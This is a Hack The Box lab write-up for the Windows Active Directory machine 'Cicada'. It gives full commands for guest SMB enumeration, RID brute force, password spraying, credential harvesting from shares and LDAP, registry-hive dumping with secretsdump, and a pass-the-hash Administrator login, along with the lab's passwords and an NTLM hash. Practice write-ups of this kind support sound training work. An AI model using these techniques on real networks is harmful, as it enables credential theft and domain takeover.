---
title: "[HTB] Cicada Writeup"
date: 2026-05-21 14:30:00 +0900
author: aestera
categories: [HTB, Writeup]
tags: [Windows, AD]
description: HTB Cicada write-up
math: true
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/79616a32a057e5e672dadb51bb96dd04.png
---

## TL;DR

Guest SMB access exposed the **HR share**, which contained a default password. **RID brute force** found domain users, and the password worked for `michael.wrightson`. LDAP enumeration exposed `david.orelious`’s password in the description field. The DEV share then leaked `emily.oscars` credentials. `emily.oscars` had WinRM access and could dump **SAM/SYSTEM**, which exposed the local Administrator hash.

---

## 1. Recon

**port scan result**
![2026-05-20-17-49-07](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-17-49-07-1779266950685.png)
Port scan showed that the target was a Windows Domain Controller.


---

## 2. Initial Access - Credential Disclosure

Guest SMB access was available, and the **HR share** was readable.

```bash
└─$ smbmap -H 10.129.231.149 -u 'guest' -p ''
```
![2026-05-20-17-58-23](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-17-58-23-1779267506285.png)


```bash
└─$ smbclient //10.129.231.149/HR -U guest
```
![2026-05-20-18-01-50](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-18-01-50-1779267713436.png)

```
└─$ cat 'Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

```
Cicada$M6Corpb*@Lp#nZp!8
```

Notice from HR.txt contained the default password.


```bash
└─$ nxc smb 10.129.231.149 -u guest -p '' --rid-brute
```
![2026-05-20-18-32-48](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-18-32-48-1779269570380.png)
```bash
└─$ cat user.txt
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Domain users were enumerated with **RID brute force**.


```bash
└─$ nxc smb 10.129.231.149 -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![2026-05-20-21-41-57](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-21-41-57-1779280919732.png)

```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

The default password worked for `michael.wrightson`


```bash
└─$ nxc ldap 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
![2026-05-20-22-17-05](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-22-17-05-1779283027911.png)
```
david.orelious:aRt$Lp#7t*VQ!3
```

**LDAP enumeration** exposed `david.orelious`’s password in the description field.


```bash
└─$ nxc smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```
![2026-05-20-22-19-17](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-22-19-17-1779283159570.png)

```bash
└─$ smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```
![2026-05-20-22-21-15](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-22-21-15-1779283302939.png)
Using `david.orelious`, the **DEV share** was accessible.


```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

A backup script in DEV contained credentials for `emily.oscars`.

```bash
└─$ evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```
![2026-05-20-22-48-12](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/20/2026-05-20-22-48-12-1779284896281.png)
The credentials worked over **WinRM**

---

## Privilege Escalation - Registry Hive Dump

`emily.oscars` had privileges that allowed saving registry hives.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
```
![2026-05-21-01-38-48](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/21/2026-05-21-01-38-48-1779295130705.png)
**SAM** and **SYSTEM** were saved.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\sam C:\Windows\Tasks\SAM
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\system C:\Windows\Tasks\SYSTEM
```

```bash
└─$ smbget -U 'emily.oscars%Q!3@Lp#M6b*7t*Vt' 'smb://10.129.231.149/C$/Windows/Tasks/SAM'

└─$ smbget -U 'emily.oscars%Q!3@Lp#M6b*7t*Vt' 'smb://10.129.231.149/C$/Windows/Tasks/SYSTEM'

└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
![2026-05-21-01-50-11](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/21/2026-05-21-01-50-11-1779295816833.png)
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

The local Administrator NTLM hash was recovered and the hash was used for **pass-the-hash** WinRM login.

```bash
└─$ evil-winrm -i 10.129.231.149 -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
```
![2026-05-21-01-53-34](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/21/2026-05-21-01-53-34-1779296017239.png)